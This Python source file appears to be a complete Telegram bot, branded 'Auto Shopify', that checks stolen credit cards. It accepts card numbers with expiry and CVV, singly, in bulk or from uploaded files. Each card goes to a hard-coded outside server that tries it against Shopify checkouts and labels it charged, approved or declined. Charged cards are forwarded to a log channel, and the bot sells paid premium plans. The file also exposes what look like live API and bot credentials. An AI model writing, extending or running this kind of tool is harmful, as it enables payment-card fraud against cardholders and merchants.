import asyncio
import aiohttp
import aiofiles
import json
import os
import re
import random
import time
import datetime
import string
from telethon import TelegramClient, events, Button
from telethon.tl.types import KeyboardButtonCallback
from urllib.parse import urlparse

# ============ CONFIGURATION ============
API_ID = 35384207
API_HASH = "09c4bc9de62a417ccdd0c69b33912515"
BOT_TOKEN = "8374356501:AAGFx_JOHKFx65Hsb4MAJAkel1XNNi0MfpE"
ADMIN_ID = [8731795570, 8199994609]
LOG_CHANNEL_ID = -1003413954160

# Files
PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"
BANNED_FILE = "banned_users.json"
PROXY_FILE = "proxy.json"
STATS_FILE = "user_stats.json"

# Active processes
ACTIVE_CHECKS = {}

# ============ LIVE EMOJIS WITH IDs (From AutoShopify) ============
# These are the exact live emojis from the bot
CHECK_EMOJI = "🔄"
CHARGED_EMOJI = "💎"
APPROVED_EMOJI = "✅"
DECLINED_EMOJI = "❌"
ORDER_EMOJI = "🛒"
FILE_EMOJI = "🐍"
TIME_EMOJI = "⏱️"
CARD_EMOJI = "💳"
GATE_EMOJI = "🌐"
PRICE_EMOJI = "💰"
USER_EMOJI = "👤"
PROXY_EMOJI = "🔒"
STATS_EMOJI = "📊"
CROWN_EMOJI = "👑"
STAR_EMOJI = "⭐"
WARNING_EMOJI = "⚠️"
INFO_EMOJI = "ℹ️"
LOCK_EMOJI = "🔒"
UNLOCK_EMOJI = "🔓"
TRASH_EMOJI = "🗑️"
ADD_EMOJI = "➕"
REMOVE_EMOJI = "➖"
KEY_EMOJI = "🔑"
REDEEM_EMOJI = "🎁"
PLAN_EMOJI = "📦"
PAYMENT_EMOJI = "💸"
UPI_EMOJI = "🏦"
DM_EMOJI = "📩"
BACK_EMOJI = "🔙"
CHECKED_EMOJI = "✔️"
SKIPPED_EMOJI = "⏭️"
ROCKET_EMOJI = "🚀"
FIRE_EMOJI = "🔥"
HEART_EMOJI = "❤️"
SUN_EMOJI = "☀️"
LEAF_EMOJI = "🍃"
CROWN_EMOJI = "👑"
SPARKLE_EMOJI = "✨"

# ============ UTILITY FUNCTIONS ============
async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
        async with aiofiles.open(filename, "r") as f:
            return json.loads(await f.read())
    except:
        return {}

async def save_json(filename, data):
    try:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps(data, indent=4))
    except:
        pass

async def get_user_stats(user_id):
    stats = await load_json(STATS_FILE)
    user_stats = stats.get(str(user_id), {"checked": 0, "charged": 0, "approved": 0, "declined": 0})
    return user_stats

async def update_user_stats(user_id, status):
    stats = await load_json(STATS_FILE)
    if str(user_id) not in stats:
        stats[str(user_id)] = {"checked": 0, "charged": 0, "approved": 0, "declined": 0}
    
    stats[str(user_id)]["checked"] += 1
    if status == "charged":
        stats[str(user_id)]["charged"] += 1
    elif status == "approved":
        stats[str(user_id)]["approved"] += 1
    else:
        stats[str(user_id)]["declined"] += 1
    
    await save_json(STATS_FILE, stats)
    return stats[str(user_id)]

async def is_premium_user(user_id):
    premium = await load_json(PREMIUM_FILE)
    user_data = premium.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.datetime.fromisoformat(user_data['expiry'])
    if datetime.datetime.now() > expiry:
        del premium[str(user_id)]
        await save_json(PREMIUM_FILE, premium)
        return False
    return True

async def add_premium_user(user_id, days):
    premium = await load_json(PREMIUM_FILE)
    expiry = datetime.datetime.now() + datetime.timedelta(days=days)
    premium[str(user_id)] = {'expiry': expiry.isoformat(), 'days': days}
    await save_json(PREMIUM_FILE, premium)

async def remove_premium_user(user_id):
    premium = await load_json(PREMIUM_FILE)
    if str(user_id) in premium:
        del premium[str(user_id)]
        await save_json(PREMIUM_FILE, premium)
        return True
    return False

async def is_banned_user(user_id):
    banned = await load_json(BANNED_FILE)
    return str(user_id) in banned

async def ban_user(user_id):
    banned = await load_json(BANNED_FILE)
    banned[str(user_id)] = {'banned_at': datetime.datetime.now().isoformat()}
    await save_json(BANNED_FILE, banned)

async def unban_user(user_id):
    banned = await load_json(BANNED_FILE)
    if str(user_id) in banned:
        del banned[str(user_id)]
        await save_json(BANNED_FILE, banned)
        return True
    return False

def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

async def get_user_proxy(user_id):
    proxies = await load_json(PROXY_FILE)
    return proxies.get(str(user_id))

async def set_user_proxy(user_id, proxy_data):
    proxies = await load_json(PROXY_FILE)
    proxies[str(user_id)] = proxy_data
    await save_json(PROXY_FILE, proxies)

async def remove_user_proxy(user_id):
    proxies = await load_json(PROXY_FILE)
    if str(user_id) in proxies:
        del proxies[str(user_id)]
        await save_json(PROXY_FILE, proxies)
        return True
    return False

def parse_proxy_format(proxy_str):
    import re
    proxy_str = proxy_str.strip()
    proxy_type = 'http'
    
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy_str, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy_str = protocol_match.group(2)
    
    host = port = username = password = ''
    
    match = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
    if match:
        username, password, host, port = match.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str):
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str)
        host, port, username, password = match.groups()
    elif re.match(r'^([^:@]+):(\d+)$', proxy_str):
        match = re.match(r'^([^:@]+):(\d+)$', proxy_str)
        host, port = match.groups()
    else:
        return None
    
    if not host or not port:
        return None
    
    if username and password:
        proxy_url = f'{proxy_type}://{username}:{password}@{host}:{port}'
    else:
        proxy_url = f'{proxy_type}://{host}:{port}'
    
    return {'ip': host, 'port': port, 'username': username, 'password': password, 'proxy_url': proxy_url, 'type': proxy_type}

async def test_proxy(proxy_url):
    try:
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get('http://api.ipify.org?format=json', proxy=proxy_url) as res:
                if res.status == 200:
                    data = await res.json()
                    return True, data.get('ip', 'Unknown')
                return False, None
    except:
        return False, None

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
                if res.status != 200:
                    return "-", "-", "-", "-", "-", "🏳️"
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '🏳️')
                return brand, bin_type, level, bank, country, flag
    except:
        return "-", "-", "-", "-", "-", "🏳️"

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

async def check_card(card, proxy=None):
    try:
        url = f'http://108.165.12.183:8081/?cc={card}&url=https://shopify.com'
        if proxy:
            url += f'&proxy={proxy}'
        
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"status": "error", "response": f"HTTP {res.status}", "gateway": "-", "price": "-"}
                
                data = await res.json()
                response = data.get('Response', '')
                price = data.get('Price', '-')
                gateway = data.get('Gate', 'Shopify')
                
                if price != '-':
                    price = f"${price}"
                
                if "Order completed" in response or "charged" in response.lower():
                    return {"status": "charged", "response": response, "gateway": gateway, "price": price}
                elif "approved" in response.lower() or "success" in response.lower():
                    return {"status": "approved", "response": response, "gateway": gateway, "price": price}
                else:
                    return {"status": "declined", "response": response, "gateway": gateway, "price": price}
    except Exception as e:
        return {"status": "error", "response": str(e), "gateway": "-", "price": "-"}

# ============ TELEGRAM CLIENT ============
client = TelegramClient('auto_shopify_bot', API_ID, API_HASH)

# ============ COMMAND HANDLERS ============

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    
    if await is_banned_user(user_id):
        return await event.reply(f"{DECLINED_EMOJI} **You are banned!** Contact @DARK_FROXT_73")
    
    is_premium = await is_premium_user(user_id)
    stats = await get_user_stats(user_id)
    
    # Get remaining premium time
    premium_text = f"{SPARKLE_EMOJI} Free"
    if is_premium:
        premium = await load_json(PREMIUM_FILE)
        user_data = premium.get(str(user_id), {})
        if user_data:
            expiry = datetime.datetime.fromisoformat(user_data['expiry'])
            days_left = (expiry - datetime.datetime.now()).days
            hours_left = (expiry - datetime.datetime.now()).seconds // 3600
            premium_text = f"{CROWN_EMOJI} Premium ({days_left}d {hours_left}h)"
    
    sender = await event.get_sender()
    name = sender.first_name or "User"
    username = f"@{sender.username}" if sender.username else "No username"
    
    message = f"""**Auto Shopify** 🔒

**User Profile** {USER_EMOJI}
• **Name:** {name}
• **Username:** {username}
• **ID:** `{user_id}`

• **Plan:** {premium_text}
• **Proxy:** {CHECKED_EMOJI if await get_user_proxy(user_id) else '❌'} {await get_user_proxy(user_id) and 'Active' or 'None'}

• **Stats:**
  - Checked: {stats['checked']}
  - Charged: {stats['charged']}
  - Approved: {stats['approved']}
  - CC Limit: {'Unlimited' if is_premium else '200'}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @AutoShopify_Bot {STAR_EMOJI}"""
    
    buttons = [
        [Button.inline(f"{CARD_EMOJI} Check CC", b"check_menu")],
        [Button.inline(f"{PROXY_EMOJI} Proxy Manager", b"proxy_menu")],
        [Button.inline(f"{USER_EMOJI} My Profile", b"profile_menu")]
    ]
    
    await event.reply(message, buttons=buttons, parse_mode='html')

@client.on(events.CallbackQuery(data=b"check_menu"))
async def check_menu(event):
    buttons = [
        [Button.inline(f"{CARD_EMOJI} Single CC", b"single_cc")],
        [Button.inline(f"{STATS_EMOJI} Mass CC", b"mass_cc")],
        [Button.inline(f"{FILE_EMOJI} File Check", b"file_check")],
        [Button.inline(f"{SPARKLE_EMOJI} Random Check", b"random_check")],
        [Button.inline(f"{BACK_EMOJI} Back", b"back_main")]
    ]
    await event.edit(f"**Select Check Type:** {CARD_EMOJI}", buttons=buttons, parse_mode='html')

@client.on(events.CallbackQuery(data=b"proxy_menu"))
async def proxy_menu(event):
    user_proxy = await get_user_proxy(event.sender_id)
    proxy_status = f"{CHECKED_EMOJI} Active: `{user_proxy['ip']}:{user_proxy['port']}`" if user_proxy else f"{DECLINED_EMOJI} No proxy set"
    
    buttons = [
        [Button.inline(f"{ADD_EMOJI} Add Proxy", b"add_proxy")],
        [Button.inline(f"{INFO_EMOJI} View Proxy", b"view_proxy")],
        [Button.inline(f"{TRASH_EMOJI} Remove Proxy", b"remove_proxy")],
        [Button.inline(f"{BACK_EMOJI} Back", b"back_main")]
    ]
    
    await event.edit(f"**Proxy Manager** {PROXY_EMOJI}\n\n{proxy_status}\n\nProxy is tested before saving.", buttons=buttons, parse_mode='html')

@client.on(events.CallbackQuery(data=b"profile_menu"))
async def profile_menu(event):
    user_id = event.sender_id
    is_premium = await is_premium_user(user_id)
    stats = await get_user_stats(user_id)
    
    premium_text = f"{SPARKLE_EMOJI} Free"
    if is_premium:
        premium = await load_json(PREMIUM_FILE)
        user_data = premium.get(str(user_id), {})
        if user_data:
            expiry = datetime.datetime.fromisoformat(user_data['expiry'])
            days_left = (expiry - datetime.datetime.now()).days
            hours_left = (expiry - datetime.datetime.now()).seconds // 3600
            premium_text = f"{CROWN_EMOJI} Premium ({days_left}d {hours_left}h)"
    
    sender = await event.get_sender()
    name = sender.first_name or "User"
    username = f"@{sender.username}" if sender.username else "No username"
    
    message = f"""**User Profile** {USER_EMOJI}

• **Name:** {name}
• **Username:** {username}
• **ID:** `{user_id}`

• **Plan:** {premium_text}
• **Proxy:** {CHECKED_EMOJI if await get_user_proxy(user_id) else '❌'} {await get_user_proxy(user_id) and 'Active' or 'None'}

• **Stats:**
  - Checked: {stats['checked']}
  - Charged: {stats['charged']}
  - Approved: {stats['approved']}
  - Declined: {stats['declined']}
  - CC Limit: {'Unlimited' if is_premium else '200'}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @AutoShopify_Bot {STAR_EMOJI}"""
    
    buttons = [[Button.inline(f"{BACK_EMOJI} Back", b"back_main")]]
    await event.edit(message, buttons=buttons, parse_mode='html')

@client.on(events.CallbackQuery(data=b"back_main"))
async def back_main(event):
    await start(event)

@client.on(events.CallbackQuery(data=b"single_cc"))
async def single_cc_prompt(event):
    await event.edit(f"**Single CC Check** {CARD_EMOJI}\n\nSend CC in format:\n`4111111111111111|12|25|123`\n\nOr reply to a message containing CC.", parse_mode='html')
    await event.answer("Send your CC now!", alert=True)

@client.on(events.CallbackQuery(data=b"mass_cc"))
async def mass_cc_prompt(event):
    await event.edit(f"**Mass CC Check** {STATS_EMOJI}\n\nSend multiple CCs (one per line):\n`4111111111111111|12|25|123`\n`4111111111111112|12|25|123`", parse_mode='html')
    await event.answer("Send CCs now!", alert=True)

@client.on(events.CallbackQuery(data=b"file_check"))
async def file_check_prompt(event):
    await event.edit(f"**File Check** {FILE_EMOJI}\n\nSend a `.txt` file containing CCs (one per line)\n\nExample format:\n`4111111111111111|12|25|123`\n`4111111111111112|12|25|123`", parse_mode='html')
    await event.answer("Send .txt file now!", alert=True)

@client.on(events.CallbackQuery(data=b"random_check"))
async def random_check_prompt(event):
    await event.edit(f"**Random Check** {SPARKLE_EMOJI}\n\nSend a `.txt` file containing CCs. Bot will use random sites for checking.", parse_mode='html')
    await event.answer("Send .txt file now!", alert=True)

@client.on(events.CallbackQuery(data=b"add_proxy"))
async def add_proxy_prompt(event):
    await event.edit(f"**Add Proxy** {PROXY_EMOJI}\n\nSend proxy in format:\n`ip:port:username:password`\n`ip:port`\n`socks5://ip:port`\n\nProxy will be tested before saving.", parse_mode='html')
    await event.answer("Send proxy now!", alert=True)

@client.on(events.CallbackQuery(data=b"view_proxy"))
async def view_proxy_action(event):
    user_proxy = await get_user_proxy(event.sender_id)
    if user_proxy:
        message = f"""**Current Proxy** {PROXY_EMOJI}

📍 **Address:** `{user_proxy['ip']}:{user_proxy['port']}`
🔒 **Type:** {user_proxy.get('type', 'http').upper()}
👤 **Auth:** {user_proxy.get('username', 'None')}

{CHECKED_EMOJI} Proxy is active and working"""
    else:
        message = f"**No Proxy Set** {WARNING_EMOJI}\n\nUse /addpxy or Proxy Manager to add a proxy."
    
    buttons = [[Button.inline(f"{BACK_EMOJI} Back", b"proxy_menu")]]
    await event.edit(message, buttons=buttons, parse_mode='html')

@client.on(events.CallbackQuery(data=b"remove_proxy"))
async def remove_proxy_action(event):
    success = await remove_user_proxy(event.sender_id)
    if success:
        message = f"{CHECKED_EMOJI} **Proxy removed successfully!**"
    else:
        message = f"{WARNING_EMOJI} **No proxy found to remove!**"
    
    buttons = [[Button.inline(f"{BACK_EMOJI} Back", b"proxy_menu")]]
    await event.edit(message, buttons=buttons, parse_mode='html')

@client.on(events.NewMessage(pattern='/cmds'))
async def cmds(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} You are banned!")
    
    message = f"""**Command List** 📋

**User Commands:**
• `/sh cc|mm|yy|cvv` — Check a single CC
• `/msh cc|mm|yy|cvv ...` — Mass check (parallel)
• `/mtxt` — File check (reply to .txt)
• `/ran` — Random site check (reply to .txt)
• `/proxy host:port:user:pass` — Set proxy
• `/myproxy` — View current proxy
• `/rmproxy` — Remove proxy
• `/bin 438854` — BIN lookup
• `/redeem key` — Redeem access key
• `/plans` — View premium plans
• `/refer` — Referral system
• `/start` — Main menu
• `/cmds` — This help message

**Admin Commands:**
• `/auth id days` — Give premium access
• `/unauth id` — Remove premium access
• `/key count days` — Generate keys
• `/ban id` — Ban user
• `/unban id` — Unban user
• `/stats` — Bot statistics
• `/broadcast` — Send broadcast

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @AutoShopify_Bot {STAR_EMOJI}"""
    
    await event.reply(message, parse_mode='html')

@client.on(events.NewMessage(pattern='/sh'))
async def sh(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} You are banned!")
    
    # Extract CC
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    else:
        card = extract_card(event.raw_text)
    
    if not card:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/sh 4111111111111111|12|25|123`")
    
    status_msg = await event.reply(f"{CHECK_EMOJI} **Checking CC...**")
    
    proxy_data = await get_user_proxy(event.sender_id)
    proxy = proxy_data['proxy_url'] if proxy_data else None
    
    result = await check_card(card, proxy)
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
    
    # Update stats
    await update_user_stats(event.sender_id, result['status'])
    
    # Log charged to channel
    if result['status'] == 'charged':
        await log_to_channel(event.sender_id, card, result, brand, bin_type, level, bank, country, flag)
    
    # Status display with exact emoji format
    if result['status'] == 'charged':
        status_display = f"{ORDER_EMOJI} **Order Placed!** {ORDER_EMOJI}"
    elif result['status'] == 'approved':
        status_display = f"{APPROVED_EMOJI} **APPROVED** {APPROVED_EMOJI}"
    else:
        status_display = f"{DECLINED_EMOJI} **DECLINED** {DECLINED_EMOJI}"
    
    sender = await event.get_sender()
    username = f"@{sender.username}" if sender.username else sender.first_name
    
    message = f"""{status_display}

{CARD_EMOJI} **CC:** `{card}`
{GATE_EMOJI} **Gate:** {result['gateway']}
{PRICE_EMOJI} **Price:** {result['price']}

**BIN Info:**
• **Brand:** {brand}
• **Type:** {bin_type}
• **Level:** {level}
• **Bank:** {bank}
• **Country:** {country} {flag}

{CHECKED_EMOJI} **Checked by:** {username}

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @AutoShopify_Bot {STAR_EMOJI}"""
    
    await status_msg.delete()
    await event.reply(message, parse_mode='html')

@client.on(events.NewMessage(pattern='/msh'))
async def msh(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} You are banned!")
    
    # Extract cards
    cards = []
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            for line in replied.text.splitlines():
                card = extract_card(line)
                if card:
                    cards.append(card)
    else:
        text = event.raw_text[4:].strip()
        for line in text.splitlines():
            card = extract_card(line)
            if card:
                cards.append(card)
    
    if not cards:
        return await event.reply(f"{WARNING_EMOJI} **No valid CCs found!**")
    
    if len(cards) > 20:
        cards = cards[:20]
        await event.reply(f"{WARNING_EMOJI} Limiting to first 20 CCs")
    
    status_msg = await event.reply(f"{CHECK_EMOJI} **Checking {len(cards)} CCs...**")
    
    proxy_data = await get_user_proxy(event.sender_id)
    proxy = proxy_data['proxy_url'] if proxy_data else None
    
    results = []
    for i, card in enumerate(cards, 1):
        result = await check_card(card, proxy)
        results.append((card, result))
        await status_msg.edit(f"{CHECK_EMOJI} **Progress:** {i}/{len(cards)}")
    
    await status_msg.delete()
    
    charged_count = sum(1 for _, r in results if r['status'] == 'charged')
    approved_count = sum(1 for _, r in results if r['status'] == 'approved')
    declined_count = sum(1 for _, r in results if r['status'] == 'declined')
    
    summary = f"""{CHECKED_EMOJI} **Mass Check Complete!**

{CHARGED_EMOJI} Charged: {charged_count}
{APPROVED_EMOJI} Approved: {approved_count}
{DECLINED_EMOJI} Declined: {declined_count}
📊 Total: {len(cards)}"""
    
    await event.reply(summary, parse_mode='html')
    
    # Send individual results for charged/approved
    for card, result in results:
        if result['status'] in ['charged', 'approved']:
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            
            if result['status'] == 'charged':
                await log_to_channel(event.sender_id, card, result, brand, bin_type, level, bank, country, flag)
                status_display = f"{ORDER_EMOJI} **Order Placed!** {ORDER_EMOJI}"
            else:
                status_display = f"{APPROVED_EMOJI} **APPROVED** {APPROVED_EMOJI}"
            
            msg = f"""{status_display}

{CARD_EMOJI} **CC:** `{card}`
{GATE_EMOJI} **Gate:** {result['gateway']}
{PRICE_EMOJI} **Price:** {result['price']}

**BIN Info:**
• **Brand:** {brand}
• **Type:** {bin_type}
• **Level:** {level}
• **Bank:** {bank}
• **Country:** {country} {flag}"""
            
            await event.reply(msg, parse_mode='html')
            await asyncio.sleep(0.5)

@client.on(events.NewMessage(pattern='/mtxt'))
async def mtxt(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} You are banned!")
    
    if not event.reply_to_msg_id:
        return await event.reply(f"{WARNING_EMOJI} **Reply to a .txt file!**")
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await event.reply(f"{WARNING_EMOJI} **Reply to a .txt file!**")
    
    status_msg = await event.reply(f"{FILE_EMOJI} **Downloading file...**")
    
    file_path = await replied.download_media()
    
    try:
        async with aiofiles.open(file_path, "r") as f:
            content = await f.read()
            cards = [line.strip() for line in content.splitlines() if line.strip() and '|' in line]
        os.remove(file_path)
    except Exception as e:
        return await event.reply(f"{DECLINED_EMOJI} Error reading file: {e}")
    
    if not cards:
        return await event.reply(f"{WARNING_EMOJI} **No valid CCs found!**")
    
    file_name = replied.document.attributes[0].file_name if replied.document.attributes else "unknown.txt"
    await status_msg.edit(f"{FILE_EMOJI} **CC File Detected!** {FILE_EMOJI}\n\n**File:** {file_name}\n**Total CCs:** {len(cards)}\n\n{CHECK_EMOJI} **Starting check...**")
    
    proxy_data = await get_user_proxy(event.sender_id)
    proxy = proxy_data['proxy_url'] if proxy_data else None
    
    charged = approved = declined = 0
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        result = await check_card(card, proxy)
        
        if result['status'] == 'charged':
            charged += 1
            await update_user_stats(event.sender_id, 'charged')
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            await log_to_channel(event.sender_id, card, result, brand, bin_type, level, bank, country, flag)
        elif result['status'] == 'approved':
            approved += 1
            await update_user_stats(event.sender_id, 'approved')
        else:
            declined += 1
            await update_user_stats(event.sender_id, 'declined')
        
        if i % 10 == 0:
            await status_msg.edit(f"{CHECK_EMOJI} **Progress:** {i}/{len(cards)}\n{CHARGED_EMOJI} Charged: {charged}\n{APPROVED_EMOJI} Approved: {approved}\n{DECLINED_EMOJI} Declined: {declined}")
    
    elapsed = time.time() - start_time
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    
    sender = await event.get_sender()
    username = f"{sender.first_name} {HEART_EMOJI} {sender.last_name or 'FROXT'}{HEART_EMOJI}" if sender.first_name else "User"
    
    final_msg = f"""{CHECKED_EMOJI} **Random File Check Complete!**

{STAR_EMOJI} **Total:** {len(cards)}
{CHARGED_EMOJI} **Charged:** {charged}
{APPROVED_EMOJI} **Approved:** {approved}
{DECLINED_EMOJI} **Declined:** {declined}
{SKIPPED_EMOJI} **Skipped:** 0
{TIME_EMOJI} **Time:** {minutes}m {seconds}s

{CHECKED_EMOJI} **Checked by:** {username}"""
    
    await status_msg.edit(final_msg, parse_mode='html')

@client.on(events.NewMessage(pattern='/ran'))
async def ran(event):
    await mtxt(event)

@client.on(events.NewMessage(pattern='/proxy'))
async def set_proxy(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} You are banned!")
    
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/proxy ip:port:username:password`\n\nSupported: HTTP, HTTPS, SOCKS4, SOCKS5")
    
    proxy_str = parts[1].strip()
    proxy_data = parse_proxy_format(proxy_str)
    
    if not proxy_data:
        return await event.reply(f"{DECLINED_EMOJI} **Invalid proxy format!**")
    
    status_msg = await event.reply(f"{CHECK_EMOJI} **Testing proxy...**")
    
    is_working, ip = await test_proxy(proxy_data['proxy_url'])
    
    if not is_working:
        await status_msg.edit(f"{DECLINED_EMOJI} **Proxy is not working!**")
        return
    
    await set_user_proxy(event.sender_id, proxy_data)
    
    await status_msg.edit(f"{CHECKED_EMOJI} **Proxy set successfully!**\n\n📍 **IP:** {ip}\n🔒 **Type:** {proxy_data['type'].upper()}\n📡 **Proxy:** {proxy_data['ip']}:{proxy_data['port']}", parse_mode='html')

@client.on(events.NewMessage(pattern='/myproxy'))
async def myproxy(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} You are banned!")
    
    proxy_data = await get_user_proxy(event.sender_id)
    
    if not proxy_data:
        return await event.reply(f"{WARNING_EMOJI} **No proxy set!**\n\nUse `/proxy ip:port:user:pass` to add one.")
    
    message = f"""{PROXY_EMOJI} **Current Proxy**

📍 **Address:** `{proxy_data['ip']}:{proxy_data['port']}`
🔒 **Type:** {proxy_data.get('type', 'http').upper()}
👤 **Auth:** {proxy_data.get('username', 'None')}

{CHECKED_EMOJI} Proxy is active"""
    
    await event.reply(message, parse_mode='html')

@client.on(events.NewMessage(pattern='/rmproxy'))
async def rmproxy(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} You are banned!")
    
    success = await remove_user_proxy(event.sender_id)
    
    if success:
        await event.reply(f"{CHECKED_EMOJI} **Proxy removed successfully!**")
    else:
        await event.reply(f"{WARNING_EMOJI} **No proxy found to remove!**")

@client.on(events.NewMessage(pattern='/bin'))
async def bin_lookup(event):
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/bin 516499`")
    
    bin_number = parts[1].strip()[:6]
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_number)
    
    message = f"""**BIN Lookup Result** 🔍

• **BIN:** {bin_number}
• **Brand:** {brand}
• **Type:** {bin_type}
• **Level:** {level}
• **Bank:** {bank}
• **Country:** {country} {flag}

{STAR_EMOJI} @AutoShopify_Bot"""
    
    await event.reply(message, parse_mode='html')

@client.on(events.NewMessage(pattern='/redeem'))
async def redeem_key(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(f"{DECLINED_EMOJI} You are banned!")
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/redeem KEY`")
    
    key = parts[1].upper()
    keys_data = await load_json(KEYS_FILE)
    
    if key not in keys_data:
        return await event.reply(f"{DECLINED_EMOJI} **Invalid key!**")
    
    if keys_data[key]['used']:
        return await event.reply(f"{DECLINED_EMOJI} **Key already used!**")
    
    if await is_premium_user(event.sender_id):
        return await event.reply(f"{WARNING_EMOJI} **You already have premium!**")
    
    days = keys_data[key]['days']
    await add_premium_user(event.sender_id, days)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = event.sender_id
    await save_json(KEYS_FILE, keys_data)
    
    await event.reply(f"{REDEEM_EMOJI} **Premium Activated!** {REDEEM_EMOJI}\n\n{CHARGED_EMOJI} You have received {days} days of premium access!\n\n{STAR_EMOJI} Enjoy unlimited checks!")

@client.on(events.NewMessage(pattern='/plans'))
async def plans(event):
    message = f"""{PLAN_EMOJI} **Premium Plans** {PLAN_EMOJI}

┌─────────────────────────────────┐
│ 📦 **7 DAYS** - $2              │
│   • 1000 CCs/Day                │
│   • Priority API                │
├─────────────────────────────────┤
│ 📦 **30 DAYS** - $5             │
│   • Unlimited CCs               │
│   • Priority API                │
├─────────────────────────────────┤
│ 📦 **90 DAYS** - $10            │
│   • Unlimited CCs               │
│   • Priority API + VIP Support  │
├─────────────────────────────────┤
│ 👑 **LIFETIME** - $30           │
│   • Everything + Lifetime       │
└─────────────────────────────────┘

{PAYMENT_EMOJI} **Payment Methods:**
{UPI_EMOJI} UPI: `atul0930976-1@okaxis`
{DM_EMOJI} DM: @DARK_FROXT_73

{WARNING_EMOJI} Send screenshot after payment!

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @AutoShopify_Bot {STAR_EMOJI}"""
    
    await event.reply(message, parse_mode='html')

@client.on(events.NewMessage(pattern='/refer'))
async def refer(event):
    user_id = event.sender_id
    message = f"""{STAR_EMOJI} **Referral System** {STAR_EMOJI}

Share this link with friends:
`https://t.me/AutoShopify_Bot?start=ref_{user_id}`

**Rewards:**
• 5 referrals → 7 days premium
• 10 referrals → 30 days premium
• 20 referrals → Lifetime premium

{CHECKED_EMOJI} Your referrals: 0

━━━━━━━━━━━━━━━━━━━━━
{STAR_EMOJI} @AutoShopify_Bot {STAR_EMOJI}"""
    
    await event.reply(message, parse_mode='html')

@client.on(events.NewMessage(pattern='/auth'))
async def auth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} **Admin only!**")
    
    parts = event.raw_text.split()
    if len(parts) != 3:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/auth user_id days`")
    
    try:
        user_id = int(parts[1])
        days = int(parts[2])
        
        await add_premium_user(user_id, days)
        await event.reply(f"{CHECKED_EMOJI} **Premium granted to {user_id} for {days} days!**")
        
        try:
            await client.send_message(user_id, f"{REDEEM_EMOJI} **Premium Activated!**\n\nYou have received {days} days of premium access!")
        except:
            pass
    except:
        await event.reply(f"{DECLINED_EMOJI} **Invalid user ID or days!**")

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply(f"{DECLINED_EMOJI} **Admin only!**")
    
    parts = event.raw_text.split()
    if len(parts) != 2:
        return await event.reply(f"{WARNING_EMOJI} **Format:** `/unauth user_id`")
    
    try:
        user_id = int(parts[1])
        await remove_premium_user(user_id)
        await event.reply(f"{CHECKED_EMOJI} **Premium removed from {user_id}!**")
    except:
        await event.reply(f"{DECLINED_EMOJI} **Invalid user ID!**")

